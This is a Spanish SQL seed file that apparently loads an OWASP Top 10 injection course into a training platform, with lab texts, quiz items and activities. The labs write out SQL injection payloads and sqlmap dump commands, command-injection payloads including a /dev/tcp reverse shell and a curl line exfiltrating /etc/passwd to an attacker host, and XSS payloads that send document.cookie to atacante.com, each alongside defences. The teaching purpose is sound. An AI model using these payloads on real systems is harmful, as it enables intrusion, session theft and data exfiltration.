-- =============================================================================
-- seed_owasp_a05_inyeccion.sql
-- Curso OWASP Top 10 2025 — A05: Inyección
-- 1 curso, 2 módulos, 4 laboratorios, 20 preguntas, 4 actividades prácticas.
-- Ejecutar en Supabase SQL Editor DESPUÉS de schema.sql, seed.sql y seeds anteriores.
-- Es idempotente: se puede volver a correr sin duplicar datos.
-- =============================================================================

-- =============================================================================
-- CURSO: OWASP A05 — Inyección (intermedio)
-- =============================================================================

INSERT INTO courses (slug, title, description, difficulty, is_published, created_by)
SELECT
  'owasp-a05-inyeccion',
  'OWASP A05: Inyección',
  'Domina los ataques de inyección del OWASP Top 10 2025. Aprende a identificar y explotar SQL Injection, Command Injection, XSS y LDAP Injection — y cómo defenderte de cada uno con validación, sanitización y consultas parametrizadas.',
  'intermedio',
  TRUE,
  id
FROM users WHERE username = 'admin'
ON CONFLICT (slug) DO UPDATE SET
  title        = EXCLUDED.title,
  description  = EXCLUDED.description,
  difficulty   = EXCLUDED.difficulty,
  is_published = EXCLUDED.is_published;

-- =============================================================================
-- MÓDULO 1: SQL Injection y Command Injection
-- =============================================================================

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id,
  'sqli-cmdi',
  'SQL Injection y Command Injection',
  'Los dos tipos de inyección más devastadores: extracción de bases de datos completas con SQLi y ejecución remota de comandos con CMDi.',
  1
FROM courses c WHERE c.slug = 'owasp-a05-inyeccion'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 1: SQL Injection — De login bypass a extracción de datos ──────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'sql-injection-basico',
  'SQL Injection: Del Login Bypass a la Extracción de Datos',
  E'## ¿Qué es SQL Injection?\n\n**SQL Injection (SQLi)** ocurre cuando datos no confiables se insertan directamente en una consulta SQL sin sanitización. El atacante puede modificar la lógica de la consulta, saltarse autenticación, extraer datos o incluso ejecutar comandos en el sistema operativo.\n\nSegún OWASP 2025, la inyección sigue siendo una de las vulnerabilidades más explotadas porque es fácil de encontrar y devastadora en su impacto.\n\n## El código vulnerable\n\n```python\n# ❌ VULNERABLE — concatenación directa de input del usuario\nquery = "SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''"\n```\n\n## Login Bypass clásico\n\nSi el usuario escribe `admin'' --` como username:\n\n```sql\n-- La consulta resultante:\nSELECT * FROM users\nWHEREusername = ''admin'' --'' AND password = ''cualquier_cosa''\n--                         ↑ comenta el resto de la consulta\n```\n\nEl `--` comenta el `AND password = ...`, así que la consulta retorna el usuario admin sin verificar la contraseña.\n\n## Tipos de SQL Injection\n\n| Tipo | Descripción | Ejemplo |\n|---|---|---|\n| **In-band (Error)** | El error SQL se muestra en la respuesta | `'' OR 1=1 --` |\n| **In-band (UNION)** | Se extrae data con UNION SELECT | `'' UNION SELECT username,password FROM users --` |\n| **Blind (Boolean)** | La app responde diferente según verdadero/falso | `'' AND 1=1 --` vs `'' AND 1=2 --` |\n| **Blind (Time)** | Se infiere data por el tiempo de respuesta | `''; IF(1=1) WAITFOR DELAY ''0:0:5'' --` |\n| **Out-of-band** | Los datos se extraen por otro canal (DNS, HTTP) | Menos común, requiere privilegios especiales |\n\n## Detección manual con curl\n\n```bash\n# Prueba básica: ¿la app devuelve error SQL?\ncurl -s "https://vulnerable.app/login" \\\n  --data "username=admin''&password=test"\n\n# Prueba UNION para detectar columnas\ncurl -s "https://vulnerable.app/search?q=test'' UNION SELECT NULL --"\ncurl -s "https://vulnerable.app/search?q=test'' UNION SELECT NULL,NULL --"\n```\n\n## Herramienta: sqlmap\n\n```bash\n# Detectar SQLi automáticamente\nsqlmap -u "https://vulnerable.app/login" \\\n  --data="username=admin&password=test" \\\n  --dbs\n\n# Extraer tablas de una base de datos específica\nsqlmap -u "https://vulnerable.app/login" \\\n  --data="username=admin&password=test" \\\n  -D nombre_db --tables\n```\n\n## Prevención\n\n```python\n# ✅ SEGURO — consulta parametrizada\ncursor.execute(\n  "SELECT * FROM users WHERE username = %s AND password = %s",\n  (username, password)\n)\n```\n\n---\nCompleta el quiz y la actividad para ganar **200 puntos**.',
  1, 30, 200, TRUE
FROM course_modules cm WHERE cm.slug = 'sqli-cmdi'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab 1

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Por qué el payload "admin'' --" permite saltarse una verificación de contraseña en SQL?',
  'Los dos guiones "--" inician un comentario en SQL, descartando todo lo que viene después (incluyendo el AND password = ...). La consulta retorna el usuario admin sin verificar la contraseña.'
FROM laboratories l WHERE l.slug = 'sql-injection-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué tipo de SQL Injection usa UNION SELECT para extraer datos de otras tablas?',
  'El SQLi In-band de tipo UNION permite adjuntar una segunda consulta SELECT a la original. Si la app muestra los resultados en pantalla, el atacante puede extraer datos de cualquier tabla accesible.'
FROM laboratories l WHERE l.slug = 'sql-injection-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Cuál es la técnica correcta para prevenir SQL Injection en una consulta de base de datos?',
  'Las consultas parametrizadas (prepared statements) separan el código SQL de los datos del usuario. El motor de base de datos nunca interpretará el input del usuario como código SQL, eliminando la vulnerabilidad.'
FROM laboratories l WHERE l.slug = 'sql-injection-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué tipo de SQLi infiere información basándose en si la aplicación tarda más o menos en responder?',
  'El Blind Time-based SQLi usa funciones como SLEEP() (MySQL) o WAITFOR DELAY (SQL Server) para provocar demoras cuando una condición es verdadera, permitiendo extraer datos bit a bit sin ver resultados directos.'
FROM laboratories l WHERE l.slug = 'sql-injection-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Usa sqlmap para detectar automáticamente vulnerabilidades SQLi en un endpoint de prueba. Copia la respuesta generada.',
  'sqlmap es la herramienta estándar de automatización de SQL Injection. El flag --dbs enumera las bases de datos disponibles una vez detectada la vulnerabilidad.'
FROM laboratories l WHERE l.slug = 'sql-injection-basico'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'El -- comenta el resto de la consulta, eliminando la verificación de contraseña', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'La comilla simple cierra la conexión con la base de datos', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'El payload activa un usuario admin oculto en todas las bases de datos', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'La doble comilla simple escapa el campo y resetea la sesión SQL', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'In-band SQLi de tipo UNION', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Blind Boolean-based SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Blind Time-based SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Out-of-band SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Usar consultas parametrizadas (prepared statements)', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Convertir el input del usuario a mayúsculas antes de usarlo', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Limitar el tamaño máximo del campo a 20 caracteres', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Usar HTTPS para cifrar la consulta SQL en tránsito', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Blind Time-based SQLi', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Blind Boolean-based SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'In-band Error-based SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Out-of-band SQLi', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Detección de SQLi con sqlmap',
  E'## Objetivo\n\nUsa sqlmap para detectar automáticamente vulnerabilidades de SQL Injection en un endpoint vulnerable de práctica.\n\n## Instrucciones\n\n```bash\nsqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch\n```\n\n**Desglose de flags:**\n- `-u`: URL objetivo con el parámetro a testear\n- `--dbs`: enumera todas las bases de datos disponibles\n- `--batch`: responde automáticamente a todas las preguntas interactivas (modo no interactivo)\n\n**Flujo completo de explotación:**\n\n```bash\n# 1. Detectar SQLi y listar bases de datos\nsqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch\n\n# 2. Listar tablas de una base de datos\nsqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch\n\n# 3. Extraer contenido de una tabla\nsqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T artists --dump --batch\n```\n\n> **Nota:** `testphp.vulnweb.com` es un sitio de práctica oficial de Acunetix, diseñado para ser vulnerable. Nunca uses sqlmap en sitios reales sin autorización escrita.\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch',
  '¡Correcto! sqlmap ha detectado el SQLi y listado las bases de datos. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'sql-injection-basico' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 2: Command Injection — Ejecución remota de comandos ──────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'command-injection',
  'Command Injection: Ejecución Remota de Comandos del SO',
  E'## ¿Qué es Command Injection?\n\n**Command Injection (CMDi)** ocurre cuando una aplicación pasa input del usuario a un intérprete de comandos del sistema operativo sin sanitización. A diferencia del SQLi que afecta la base de datos, el CMDi da al atacante control directo sobre el servidor.\n\n## Código vulnerable\n\n```python\n# ❌ VULNERABLE — el input del usuario llega directo a la shell\nimport os\ndef ping_host(host):\n    return os.system("ping -c 1 " + host)\n\n# Usuario envía: "8.8.8.8; cat /etc/passwd"\n# Se ejecuta: ping -c 1 8.8.8.8; cat /etc/passwd\n```\n\n## Operadores de encadenamiento en bash\n\nUn atacante puede encadenar comandos usando estos operadores:\n\n| Operador | Comportamiento | Ejemplo |\n|---|---|---|\n| `;` | Ejecuta ambos, sin importar el resultado | `ping 8.8.8.8; id` |\n| `&&` | Ejecuta el segundo solo si el primero tiene éxito | `ping 8.8.8.8 && whoami` |\n| `\\|\\|` | Ejecuta el segundo solo si el primero falla | `ping INVALIDO \\|\\| id` |\n| `\\|` | Pasa la salida del primero al segundo | `cat /etc/passwd \\| grep root` |\n| `` `cmd` `` | Ejecuta cmd y sustituye su salida | `` ping `whoami`.atacante.com `` |\n| `$(cmd)` | Igual que backticks, más moderno | `ping $(whoami).atacante.com` |\n\n## Blind Command Injection\n\nCuando la app no muestra la salida del comando, se puede inferir la ejecución:\n\n```bash\n# Técnica de delay: si la respuesta tarda 5s, hay CMDi\n8.8.8.8; sleep 5\n\n# Técnica de DNS out-of-band: el servidor hará una consulta DNS\n8.8.8.8; nslookup $(whoami).tuservidor.burpcollaborator.net\n\n# Exfiltrar via HTTP\n8.8.8.8; curl https://tuservidor.com/$(cat /etc/passwd | base64)\n```\n\n## Detección y explotación con curl\n\n```bash\n# Probar separador ; para encadenar comandos\ncurl -s "https://vulnerable.app/ping" \\\n  --data "host=8.8.8.8;id"\n\n# Probar con codificación URL\ncurl -s "https://vulnerable.app/ping" \\\n  --data "host=8.8.8.8%3Bwhoami"\n\n# Obtener una reverse shell\ncurl -s "https://vulnerable.app/ping" \\\n  --data "host=8.8.8.8;bash+-i+>&+/dev/tcp/ATACANTE/4444+0>&1"\n```\n\n## Prevención\n\n```python\n# ✅ OPCIÓN 1 — usar librería nativa en vez de shell\nimport subprocess\nresult = subprocess.run(\n  ["ping", "-c", "1", host],  # lista de argumentos, sin shell=True\n  capture_output=True\n)\n\n# ✅ OPCIÓN 2 — validar con allowlist estricta\nimport re\nif not re.match(r''^[0-9.]{7,15}$'', host):\n  raise ValueError("IP inválida")\n```\n\n---\nCompleta el quiz y la actividad para ganar **280 puntos**.',
  2, 35, 280, TRUE
FROM course_modules cm WHERE cm.slug = 'sqli-cmdi'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab 2

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué hace el operador ";" en un payload de Command Injection como "8.8.8.8; id"?',
  'El punto y coma ";" en bash separa comandos y ejecuta el segundo independientemente del resultado del primero. Es el operador más básico de encadenamiento en Command Injection.'
FROM laboratories l WHERE l.slug = 'command-injection'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Cuál es la diferencia principal entre SQL Injection y Command Injection en términos de impacto?',
  'Command Injection da control directo sobre el sistema operativo del servidor (ejecutar comandos, leer/escribir archivos, crear reverse shells). SQLi afecta principalmente la base de datos. CMDi suele tener mayor impacto.'
FROM laboratories l WHERE l.slug = 'command-injection'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué técnica se usa en Blind Command Injection cuando la aplicación no muestra la salida del comando?',
  'En Blind CMDi, la técnica de delay usa "sleep 5" o "ping -c 5 127.0.0.1" para causar una demora medible en la respuesta HTTP. Si la respuesta tarda los segundos esperados, el comando se ejecutó.'
FROM laboratories l WHERE l.slug = 'command-injection'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Cuál de estas es la forma más segura de ejecutar un comando del sistema en Python?',
  'subprocess.run() con una lista de argumentos (sin shell=True) no invoca la shell del SO. Cada elemento de la lista es un argumento separado, haciendo imposible el encadenamiento de comandos por parte del atacante.'
FROM laboratories l WHERE l.slug = 'command-injection'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Encadena un comando "id" a un argumento de ping usando el separador ";" para simular un Command Injection. Copia la respuesta generada.',
  'Este ejercicio simula la concatenación de comandos que ocurre cuando una app pasa input directamente a la shell. El separador ";" ejecuta "id" después de ping, mostrando el usuario del proceso.'
FROM laboratories l WHERE l.slug = 'command-injection'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Separa y ejecuta un segundo comando después del primero', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Ejecuta el segundo comando solo si el primero falla', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Pasa la salida del primer comando al segundo', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Comenta el resto de la línea de comandos', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'CMDi da control sobre el SO del servidor; SQLi afecta principalmente la base de datos', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'SQLi es más peligroso porque puede borrar toda la base de datos', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Son exactamente iguales en términos de impacto', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'CMDi solo funciona en servidores Linux', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Técnica de delay: medir si la respuesta tarda los segundos indicados por "sleep"', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Leer el archivo /var/log/syslog buscando el output', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Usar UNION para extraer la salida del comando', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Analizar el código de estado HTTP de la respuesta', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'subprocess.run(["ping", "-c", "1", host]) — lista de argumentos sin shell=True', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'os.system("ping -c 1 " + host.strip())', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'subprocess.run("ping -c 1 " + host, shell=True)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'os.popen("ping -c 1 " + host).read()', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Simulación de Command Injection con encadenamiento bash',
  E'## Objetivo\n\nSimula un Command Injection encadenando el comando "id" a un ping usando el separador ";", tal como lo haría un atacante en una app vulnerable.\n\n## Instrucciones\n\n```bash\nping -c 1 127.0.0.1; id\n```\n\n**¿Qué está pasando?**\n\n- `ping -c 1 127.0.0.1`: el comando "legítimo" que la app ejecutaría\n- `;`: separador que permite encadenar un segundo comando\n- `id`: comando adicional inyectado que muestra el usuario actual\n\n**Resultado esperado:**\n```\nPING 127.0.0.1 ... 1 packets transmitted\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nSi una app web pasara "127.0.0.1; id" como input a os.system("ping -c 1 " + host), el servidor ejecutaría ambos comandos. El segundo podría ser cualquier cosa: "cat /etc/passwd", "whoami", o una reverse shell completa.\n\n**Otros separadores a probar:**\n```bash\nping -c 1 127.0.0.1 && id\nping -c 1 127.0.0.1 || id\nping -c 1 $(id)\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'ping -c 1 127.0.0.1; id',
  '¡Excelente! Has encadenado comandos exitosamente. Así se ve un Command Injection real. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'command-injection' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- =============================================================================
-- MÓDULO 2: XSS y Otras Inyecciones
-- =============================================================================

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id,
  'xss-otras-inyecciones',
  'XSS y Otras Inyecciones',
  'Cross-Site Scripting para atacar navegadores de otros usuarios, y LDAP Injection para comprometer directorios de autenticación empresarial.',
  2
FROM courses c WHERE c.slug = 'owasp-a05-inyeccion'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 3: Cross-Site Scripting (XSS) ────────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'xss-cross-site-scripting',
  'XSS: Cross-Site Scripting y Robo de Sesiones',
  E'## ¿Qué es XSS?\n\n**Cross-Site Scripting (XSS)** es una inyección de código JavaScript malicioso en páginas web que otros usuarios visitarán. A diferencia del SQLi y CMDi que atacan al servidor, XSS ataca al **navegador de la víctima**.\n\nEl atacante no necesita acceso directo a la víctima: basta con que ella visite una página que contenga el script malicioso.\n\n## Tipos de XSS\n\n| Tipo | Descripción | Persistencia |\n|---|---|---|\n| **Reflected** | El payload va en la URL/request y se refleja en la respuesta | No persiste |\n| **Stored** | El payload se guarda en la base de datos y se sirve a otros usuarios | Persiste |\n| **DOM-based** | El payload manipula el DOM del cliente sin pasar por el servidor | No persiste |\n\n## XSS Reflected — el más común\n\n```\n# URL maliciosa que el atacante envía a la víctima:\nhttps://tienda.com/buscar?q=<script>document.location=''https://atacante.com/steal?c=''+document.cookie</script>\n\n# Si la app refleja el parámetro sin sanitizar:\n<p>Resultados para: <script>document.location=...   ← ejecutado en el navegador de la víctima\n```\n\n## XSS Stored — el más peligroso\n\n```html\n<!-- Atacante publica este comentario en un foro vulnerable: -->\n<script>\n  fetch(''https://atacante.com/log?cookie='' + document.cookie);\n</script>\n\n<!-- Cada usuario que cargue esa página ejecutará el script -->\n```\n\n## Impacto real de XSS\n\n- **Robo de cookies de sesión** → suplantación de identidad\n- **Keylogging** → captura de contraseñas en tiempo real\n- **Defacement** → modificar visualmente la página\n- **Redirección** → enviar a la víctima a un sitio de phishing\n- **Descarga de malware** → forzar descargas automáticas\n\n## Payload de robo de cookies\n\n```javascript\n// Payload clásico: envía la cookie al servidor del atacante\n<script>new Image().src="https://atacante.com/steal?c="+document.cookie</script>\n\n// Versión con fetch (más moderna)\n<script>fetch("https://atacante.com/steal?c="+btoa(document.cookie))</script>\n\n// Payload minimalista para detectar XSS (no roba datos)\n<script>alert(document.domain)</script>\n```\n\n## Prevención\n\n| Técnica | Descripción |\n|---|---|\n| **Escapar el output** | Convertir `<` en `&lt;`, `>` en `&gt;`, etc. antes de renderizar |\n| **Content Security Policy (CSP)** | Header HTTP que restringe qué scripts pueden ejecutarse |\n| **HttpOnly cookies** | Las cookies con este flag no son accesibles desde JavaScript |\n| **Sanitización de input** | Usar librerías como DOMPurify para limpiar HTML del usuario |\n\n```http\n# Header CSP que bloquea scripts inline\nContent-Security-Policy: default-src ''self''; script-src ''self''\n\n# Cookie con HttpOnly (no accesible por JS)\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\n---\nCompleta el quiz y la actividad para ganar **220 puntos**.',
  1, 30, 220, TRUE
FROM course_modules cm WHERE cm.slug = 'xss-otras-inyecciones'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab 3

